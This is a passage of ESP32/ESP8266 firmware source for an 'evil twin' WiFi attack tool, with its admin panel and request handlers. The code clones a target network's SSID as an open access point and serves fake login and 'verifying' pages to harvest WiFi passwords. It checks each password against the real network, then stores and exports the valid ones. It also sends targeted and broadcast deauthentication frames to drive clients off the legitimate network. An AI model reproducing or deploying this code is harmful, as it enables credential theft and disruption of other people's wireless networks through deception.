    html += "<td>" + signalBars + " " + String(networks[i].rssi) + " dBm</td>";
    html += "<td>" + String(networks[i].ch) + "</td>";
    html += "<td>" + encType + "</td>";
    html += "<td>" + lastSeen + "</td>";
    html += "<td><button class='btn btn-sm " + String(isSelected ? "btn-success" : "btn-secondary") + "' onclick='selectNetwork(\"" + bytesToString(networks[i].bssid, 6) + "\")'>" + 
            String(isSelected ? "Selected" : "Select") + "</button></td>";
    html += "</tr>";
  }

  html += R"(</tbody>
      </table>
    </div>

    <div id="credentials" class="tab-content">
      <div class="credentials-list">)";

  if(credentialCount > 0) {
    for(int i = 0; i < credentialCount; i++) {
      html += "<div class='credential-item'>";
      html += "<div class='credential-header'>";
      html += "<div class='credential-ssid'>" + capturedCredentials[i].ssid + "</div>";
      html += "<div class='credential-time'>" + getTimeAgo(capturedCredentials[i].timestamp) + "</div>";
      html += "</div>";
      html += "<div class='credential-password'>" + capturedCredentials[i].password + "</div>";
      html += "<div style='font-size: 0.8rem; color: #666; margin-top: 0.5rem;'>";
      html += "BSSID: " + capturedCredentials[i].bssid + " | IP: " + capturedCredentials[i].ipAddress;
      html += "</div>";
      html += "</div>";
    }
  } else {
    html += "<div class='credential-item'>";
    html += "<div style='text-align: center; color: #666;'>No credentials captured yet</div>";
    html += "</div>";
  }

  html += R"(</div>
    </div>

    <div id="config" class="tab-content">
      <div class="config-grid">
        <div class="config-card">
          <div class="config-title">Deauth Configuration</div>
          <div class="form-group">
            <label>Power Level (0-100)</label>
            <input type="range" id="deauthPower" min="0" max="100" value=")" + String(deauthPower) + R"(" onchange="this.nextElementSibling.textContent = this.value + '%'">
            <span>)" + String(deauthPower) + R"(%</span>
          </div>
          <div class="form-group">
            <label>Interval (ms)</label>
            <input type="number" id="deauthInterval" value=")" + String(deauthInterval) + R"(" min="100" max="5000">
          </div>
          <div class="form-group">
            <label>
              <input type="checkbox" id="autoDeauth" )" + String(autoDeauth ? "checked" : "") + R"(>
              Auto Deauth on Target Selection
            </label>
          </div>
          <button class="btn btn-success" onclick="updateConfig()">Update Configuration</button>
        </div>

        <div class="config-card">
          <div class="config-title">System Information</div>
          <div style="font-family: monospace; font-size: 0.9rem; line-height: 1.8;">
            <div><strong>Board:</strong> )" + String(BOARD_TYPE) + R"(</div>
            <div><strong>Uptime:</strong> )" + uptime + R"(</div>
            <div><strong>Free Memory:</strong> )" + String(ESP.getFreeHeap()) + R"( bytes</div>
            <div><strong>Flash Size:</strong> )" + String(ESP.getFlashChipSize()) + R"( bytes</div>
            <div><strong>CPU Frequency:</strong> )" + String(ESP.getCpuFreqMHz()) + R"( MHz</div>
            <div><strong>SDK Version:</strong> )" + String(ESP.getSdkVersion()) + R"(</div>
          </div>
        </div>
      </div>
    </div>

    <div id="monitor" class="tab-content">
      <div class="alert alert-info">
        <strong>Real-time Monitoring:</strong> System activity and network statistics
      </div>

      <div class="config-grid">
        <div class="config-card">
          <div class="config-title">Network Activity</div>
          <div style="font-family: monospace; font-size: 0.9rem; line-height: 1.8;">
            <div>Active Connections: )" + String(connectedClients) + R"(</div>
            <div>Total Attempts: )" + String(totalAttempts) + R"(</div>
            <div>Success Rate: )" + String(totalAttempts > 0 ? String((successfulCaptures * 100) / totalAttempts) : "0") + R"(%</div>
            <div>Networks Scanned: )" + String(getNetworkCount()) + R"(</div>
          </div>
        </div>

        <div class="config-card">
          <div class="config-title">System Performance</div>
          <div style="font-family: monospace; font-size: 0.9rem; line-height: 1.8;">
            <div>Memory Usage: )" + String(100 - (ESP.getFreeHeap() * 100 / ESP.getHeapSize())) + R"(%</div>
            <div>WiFi Signal: )" + String(WiFi.RSSI()) + R"( dBm</div>
            <div>Temperature: )" + String(getTemperature()) + R"(&deg;C</div>
            <div>Voltage: )" + String(getVoltage()) + R"(V</div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
</body></html>";

  return html;
}

String getSignalBars(int rssi) {
  String bars = "<div class='signal-bars'>";
  int strength = 0;

  if(rssi > -50) strength = 4;
  else if(rssi > -60) strength = 3;
  else if(rssi > -70) strength = 2;
  else if(rssi > -80) strength = 1;

  for(int i = 0; i < 4; i++) {
    bars += "<div class='signal-bar" + String(i < strength ? " active" : "") + "'></div>";
  }

  bars += "</div>";
  return bars;
}

String getEncryptionType(uint8_t encType) {
  switch(encType) {
    case 0: return "Open";
    case 1: return "WEP";
    case 2: return "WPA";
    case 3: return "WPA2";
    case 4: return "WPA/WPA2";
    case 5: return "WPA2-Enterprise";
    case 6: return "WPA3";
    default: return "Unknown";
  }
}

String getTimeAgo(unsigned long timestamp) {
  unsigned long now = millis();
  if(timestamp == 0) return "Never";

  unsigned long diff = (now - timestamp) / 1000;

  if(diff < 60) return String(diff) + "s ago";
  if(diff < 3600) return String(diff / 60) + "m ago";
  if(diff < 86400) return String(diff / 3600) + "h ago";
  return String(diff / 86400) + "d ago";
}

String getUptime() {
  unsigned long seconds = millis() / 1000;
  unsigned long minutes = seconds / 60;
  unsigned long hours = minutes / 60;
  unsigned long days = hours / 24;

  if(days > 0) return String(days) + "d " + String(hours % 24) + "h";
  if(hours > 0) return String(hours) + "h " + String(minutes % 60) + "m";
  return String(minutes) + "m " + String(seconds % 60) + "s";
}

int getNetworkCount() {
  int count = 0;
  for(int i = 0; i < 64; i++) {
    if(networks[i].ssid.length() > 0) count++;
    else break;
  }
  return count;
}

float getTemperature() {
  #ifdef ESP32
    return temperatureRead();
  #else
    return 25.0; // Placeholder for ESP8266
  #endif
}

float getVoltage() {
  #ifdef ESP32
    return 3.3;
  #else
    return ESP.getVcc() / 1000.0;
  #endif
}

void handleRoot() {
  if(!hotspotActive) {
    webServer.send(200, "text/html", getAdminPanel());
    return;
  }

  totalAttempts++;
  connectedClients = WiFi.softAPgetStationNum();
  webServer.send(200, "text/html", getTemplate(currentTemplate, selectedNetwork.ssid));
}

void handleAdmin() {
  if(webServer.hasArg("select")) {
    String bssid = webServer.arg("select");
    for(int i = 0; i < 64; i++) {
      if(bytesToString(networks[i].bssid, 6) == bssid) {
        selectedNetwork = networks[i];
        Serial.println("Selected network: " + selectedNetwork.ssid);
        if(autoDeauth && !deauthActive) {
          deauthActive = true;
        }
        break;
      }
    }
  }

  if(webServer.hasArg("hotspot")) {
    bool newState = webServer.arg("hotspot") == "true";
    if(newState && selectedNetwork.ssid.length() > 0) {
      startAdvancedEvilTwin();
    } else if(!newState) {
      stopAdvancedEvilTwin();
    }
  }

  if(webServer.hasArg("deauth")) {
    deauthActive = webServer.arg("deauth") == "true";
    Serial.println("Deauth " + String(deauthActive ? "activated" : "deactivated"));
  }

  webServer.send(200, "text/html", getAdminPanel());
}

void handleLogin() {
  webServer.send(200, "text/html", getTemplate(currentTemplate, selectedNetwork.ssid));
}

void handleVerify() {
  if(!webServer.hasArg("password")) {
    webServer.send(400, "text/html", "Bad Request");
    return;
  }

  attemptedPassword = webServer.arg("password");
  String clientIP = webServer.client().remoteIP().toString();
  String userAgent = webServer.header("User-Agent");

  Serial.println("Credential attempt:");
  Serial.println("  SSID: " + selectedNetwork.ssid);
  Serial.println("  Password: " + attemptedPassword);
  Serial.println("  IP: " + clientIP);
  Serial.println("  User-Agent: " + userAgent);

  String verifyHTML = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Verifying Connection...</title>" + getAdvancedCSS() + R"(
</head><body>
<div class="container">
  <div class="header">
    <div class="logo">VERIFYING</div>
    <div class="subtitle">Please wait while we authenticate your credentials</div>
  </div>
  <div class="loading">
    <div class="spinner"></div>
    <div>Authenticating your credentials...</div>
    <div>This may take a few moments</div>
    <div class="progress-container">
      <div class="progress-bar" style="width: 0%; animation: progressAnimation 12s linear forwards;"></div>
    </div>
  </div>
</div>
<style>
@keyframes progressAnimation {
  0% { width: 0%; }
  100% { width: 100%; }
}
</style>
<script>
let progress = 0;
const messages = [
  'Connecting to network...',
  'Validating credentials...',
  'Checking signal strength...',
  'Establishing secure connection...',
  'Finalizing authentication...'
];

function updateMessage() {
  if (progress < messages.length) {
    document.querySelector('.loading div:nth-child(2)').textContent = messages[progress];
    progress++;
    setTimeout(updateMessage, 2400);
  }
}

updateMessage();

setTimeout(() => {
  window.location.href = '/success';
}, 12000);
</script>
</body></html>)";

  webServer.send(200, "text/html", verifyHTML);

  // Test connection in background
  testCredentials();
}

void handleSuccess() {
  bool connectionSuccessful = (WiFi.status() == WL_CONNECTED);

  if(connectionSuccessful) {
    // Store successful credential
    if(credentialCount < 32) {
      capturedCredentials[credentialCount].ssid = selectedNetwork.ssid;
      capturedCredentials[credentialCount].password = attemptedPassword;
      capturedCredentials[credentialCount].bssid = bytesToString(selectedNetwork.bssid, 6);
      capturedCredentials[credentialCount].timestamp = millis();
      capturedCredentials[credentialCount].ipAddress = webServer.client().remoteIP().toString();
      capturedCredentials[credentialCount].userAgent = webServer.header("User-Agent");
      credentialCount++;
      successfulCaptures++;
    }

    Serial.println("SUCCESS! Valid credentials captured");

    String successHTML = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Connection Successful</title>" + getAdvancedCSS() + R"(
</head><body>
<div class="container">
  <div class="header">
    <div class="logo">CONNECTION SUCCESSFUL</div>
    <div class="subtitle">Welcome to the network</div>
  </div>
  <div class="alert alert-success">
    <strong>Success!</strong> You are now connected to the internet with full access to all network resources.
  </div>
  <div class="alert alert-info">
    <strong>Connection Details:</strong><br>
    Network: )" + selectedNetwork.ssid + R"(<br>
    Signal Strength: Excellent<br>
    Connection Speed: High-Speed<br>
    Security: WPA2/WPA3 Protected
  </div>
  <div style="text-align: center; margin-top: 2rem;">
    <button class="btn btn-success" onclick="window.close()">Continue Browsing</button>
  </div>
</div>
<script>
setTimeout(() => {
  window.close();
}, 5000);
</script>
</body></html>)";

    webServer.send(200, "text/html", successHTML);
  } else {
    String errorHTML = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Authentication Failed</title>" + getAdvancedCSS() + R"(
</head><body>
<div class="container">
  <div class="header">
    <div class="logo">AUTHENTICATION FAILED</div>
    <div class="subtitle">Connection could not be established</div>
  </div>
  <div class="alert alert-danger">
    <strong>Authentication Error:</strong> The provided credentials could not be verified. Please check your password and try again.
  </div>
  <div class="alert alert-warning">
    <strong>Troubleshooting:</strong><br>
    - Ensure you entered the correct password<br>
    - Check if the network is within range<br>
    - Contact network administrator if issues persist
  </div>
  <div style="text-align: center; margin-top: 2rem;">
    <button class="btn btn-warning" onclick="history.back()">Try Again</button>
  </div>
</div>
<script>
setTimeout(() => {
  window.location.href = '/';
}, 10000);
</script>
</body></html>)";

    webServer.send(200, "text/html", errorHTML);
  }
}

void handleScan() {
  performAdvancedNetworkScan();
  webServer.send(200, "text/html", getAdminPanel());
}

void handleTemplate() {
  if(webServer.hasArg("id")) {
    currentTemplate = webServer.arg("id").toInt();
    if(currentTemplate < 1 || currentTemplate > TEMPLATE_COUNT) {
      currentTemplate = 1;
    }
    Serial.println("Template changed to: " + templateNames[currentTemplate - 1]);
  }
  webServer.send(200, "text/html", getAdminPanel());
}

void handleConfig() {
  if(webServer.hasArg("power")) {
    deauthPower = webServer.arg("power").toInt();
    deauthPower = constrain(deauthPower, 0, 100);
  }

  if(webServer.hasArg("interval")) {
    deauthInterval = webServer.arg("interval").toInt();
    deauthInterval = constrain(deauthInterval, 100, 5000);
  }

  if(webServer.hasArg("auto")) {
    autoDeauth = webServer.arg("auto") == "true";
  }

  Serial.println("Configuration updated");
  webServer.send(200, "text/html", getAdminPanel());
}

void handleMonitor() {
  monitoring = !monitoring;
  Serial.println("Monitoring " + String(monitoring ? "enabled" : "disabled"));
  webServer.send(200, "text/html", getAdminPanel());
}

void handleCredentials() {
  String json = "{\"credentials\":[";
  for(int i = 0; i < credentialCount; i++) {
    if(i > 0) json += ",";
    json += "{";
    json += "\"ssid\":\"" + capturedCredentials[i].ssid + "\",";
    json += "\"password\":\"" + capturedCredentials[i].password + "\",";
    json += "\"bssid\":\"" + capturedCredentials[i].bssid + "\",";
    json += "\"timestamp\":" + String(capturedCredentials[i].timestamp) + ",";
    json += "\"ip\":\"" + capturedCredentials[i].ipAddress + "\",";
    json += "\"userAgent\":\"" + capturedCredentials[i].userAgent + "\"";
    json += "}";
  }
  json += "]}";

  webServer.send(200, "application/json", json);
}

void handleExport() {
  String data = "# Advanced Evil Twin Portal - Data Export\n";
  data += "# Generated: " + String(millis()) + "\n";
  data += "# Board: " + String(BOARD_TYPE) + "\n\n";

  data += "=== CAPTURED CREDENTIALS ===\n";
  for(int i = 0; i < credentialCount; i++) {
    data += "SSID: " + capturedCredentials[i].ssid + "\n";
    data += "Password: " + capturedCredentials[i].password + "\n";
    data += "BSSID: " + capturedCredentials[i].bssid + "\n";
    data += "Timestamp: " + String(capturedCredentials[i].timestamp) + "\n";
    data += "IP Address: " + capturedCredentials[i].ipAddress + "\n";
    data += "User Agent: " + capturedCredentials[i].userAgent + "\n";
    data += "---\n";
  }

  data += "\n=== NETWORK SCAN RESULTS ===\n";
  for(int i = 0; i < 64; i++) {
    if(networks[i].ssid.length() == 0) break;
    data += "SSID: " + networks[i].ssid + "\n";
    data += "BSSID: " + bytesToString(networks[i].bssid, 6) + "\n";
    data += "Channel: " + String(networks[i].ch) + "\n";
    data += "RSSI: " + String(networks[i].rssi) + "\n";
    data += "Encryption: " + getEncryptionType(networks[i].encType) + "\n";
    data += "---\n";
  }

  webServer.send(200, "text/plain", data);
}

void handleReset() {
  Serial.println("System reset requested");

  // Clear credentials
  for(int i = 0; i < 32; i++) {
    capturedCredentials[i] = Credential();
  }
  credentialCount = 0;

  // Reset counters
  totalAttempts = 0;
  successfulCaptures = 0;

  // Stop operations
  stopAdvancedEvilTwin();
  deauthActive = false;
  monitoring = false;

  Serial.println("System reset completed");
  webServer.send(200, "text/html", getAdminPanel());
}

void handleNotFound() {
  if(!hotspotActive) {
    webServer.send(404, "text/html", "Not Found");
    return;
  }

  // Redirect all requests to captive portal
  webServer.send(200, "text/html", getTemplate(currentTemplate, selectedNetwork.ssid));
}

void startAdvancedEvilTwin() {
  if(selectedNetwork.ssid.length() == 0) {
    Serial.println("No network selected");
    return;
  }

  Serial.println("Starting advanced evil twin...");

  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(200);

  // Configure advanced AP settings
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

  #ifdef ESP32
    WiFi.softAP(selectedNetwork.ssid.c_str(), "", selectedNetwork.ch, 0, 8);
    esp_wifi_set_channel(selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);
  #else
    WiFi.softAP(selectedNetwork.ssid.c_str(), "", selectedNetwork.ch, 0, 8);
    wifi_set_channel(selectedNetwork.ch);
  #endif

  dnsServer.start(DNS_PORT, "*", apIP);

  hotspotActive = true;
  Serial.println("Advanced evil twin active: " + selectedNetwork.ssid);
  Serial.println("Channel: " + String(selectedNetwork.ch));
}

void stopAdvancedEvilTwin() {
  Serial.println("Stopping advanced evil twin...");

  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(200);

  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("WiFi_Security_Test", "admin123", 1, 0, 8);
  dnsServer.start(DNS_PORT, "*", apIP);

  hotspotActive = false;
  Serial.println("Advanced evil twin stopped");
}

void performAdvancedNetworkScan() {
  Serial.println("Performing advanced network scan...");
  scanActive = true;

  // Clear existing networks
  for(int i = 0; i < 64; i++) {
    networks[i] = Network();
  }

  int networkCount = WiFi.scanNetworks(false, true); // Async scan with hidden networks

  if(networkCount > 0) {
    Serial.println("Found " + String(networkCount) + " networks");

    for(int i = 0; i < networkCount && i < 64; i++) {
      networks[i].ssid = WiFi.SSID(i);
      networks[i].rssi = WiFi.RSSI(i);
      networks[i].ch = WiFi.channel(i);
      networks[i].encType = WiFi.encryptionType(i);
      networks[i].hidden = (networks[i].ssid.length() == 0);
      networks[i].lastSeen = millis();

      if(networks[i].hidden) {
        networks[i].ssid = "[Hidden Network]";
      }

      #ifdef ESP32
        WiFi.BSSID(i, networks[i].bssid);
      #else
        uint8_t* bssid = WiFi.BSSID(i);
        memcpy(networks[i].bssid, bssid, 6);
      #endif

      Serial.println("  " + networks[i].ssid + " (" + String(networks[i].rssi) + " dBm, Ch:" + String(networks[i].ch) + ")");
    }
  } else {
    Serial.println("No networks found");
  }

  scanActive = false;
  lastScan = millis();
}

void testCredentials() {
  if(selectedNetwork.ssid.length() == 0 || attemptedPassword.length() == 0) return;

  Serial.println("Testing credentials...");

  WiFi.disconnect();
  delay(100);

  WiFi.begin(selectedNetwork.ssid.c_str(), attemptedPassword.c_str(), selectedNetwork.ch, selectedNetwork.bssid);

  unsigned long startTime = millis();
  while(WiFi.status() != WL_CONNECTED && millis() - startTime < 10000) {
    delay(100);
  }

  if(WiFi.status() == WL_CONNECTED) {
    Serial.println("Credentials valid!");
  } else {
    Serial.println("Credentials invalid");
  }
}

void performAdvancedDeauthAttack() {
  if(!deauthActive || selectedNetwork.ssid.length() == 0) return;

  #ifdef ESP32
    esp_wifi_set_channel(selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);
  #else
    wifi_set_channel(selectedNetwork.ch);
  #endif

  // Use different deauth patterns for better effectiveness
  int patternIndex = (millis() / 5000) % 3;
  uint8_t* deauthPacket = deauthPatterns[patternIndex];

  // Set target and source addresses
  memcpy(&deauthPacket[10], selectedNetwork.bssid, 6); // Destination
  memcpy(&deauthPacket[16], selectedNetwork.bssid, 6); // Source

  // Send multiple packets with different reason codes
  for(int i = 0; i < 3; i++) {
    deauthPacket[24] = i + 1; // Reason code

    #ifdef ESP32
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, 26, false);
    #else
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
    #endif

    delay(10);
  }

  // Broadcast deauth
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  memcpy(&deauthPacket[10], broadcast, 6);

  #ifdef ESP32
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, 26, false);
  #else
    wifi_send_pkt_freedom(deauthPacket, 26, 0);
  #endif

  lastDeauth = millis();
}

String bytesToString(const uint8_t* bytes, uint32_t length) {
  String result = "";
  for(uint32_t i = 0; i < length; i++) {
    if(bytes[i] < 0x10) result += "0";
    result += String(bytes[i], HEX);
    if(i < length - 1) result += ":";
  }
  result.toUpperCase();
  return result;
}

void updateSystemStats() {
  connectedClients = WiFi.softAPgetStationNum();

  if(monitoring) {
    Serial.println("=== System Stats ===");
    Serial.println("Connected Clients: " + String(connectedClients));
    Serial.println("Total Attempts: " + String(totalAttempts));
    Serial.println("Successful Captures: " + String(successfulCaptures));
    Serial.println("Success Rate: " + String(totalAttempts > 0 ? (successfulCaptures * 100) / totalAttempts : 0) + "%");
    Serial.println("Free Memory: " + String(ESP.getFreeHeap()) + " bytes");
    Serial.println("Uptime: " + getUptime());
  }
}

void loop() {
  // Core processing
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Advanced deauth attack
  if(deauthActive && millis() - lastDeauth > deauthInterval) {
    performAdvancedDeauthAttack();
  }

  // Automatic network scanning
  if(millis() - lastScan > 60000) { // Every minute
    if(!scanActive && !hotspotActive) {
      performAdvancedNetworkScan();
    }
  }

  // System monitoring
  if(millis() - lastStatusCheck > 10000) { // Every 10 seconds
    updateSystemStats();
    lastStatusCheck = millis();
  }

  // Credential validation check
  if(attemptedPassword.length() > 0 && WiFi.status() == WL_CONNECTED) {
    Serial.println("Credential validation successful");
    attemptedPassword = "";
  }

  // Memory management
  if(ESP.getFreeHeap() < 10000) {
    Serial.println("Low memory warning");
  }

  // Minimal delay for stability
  delay(5);
}
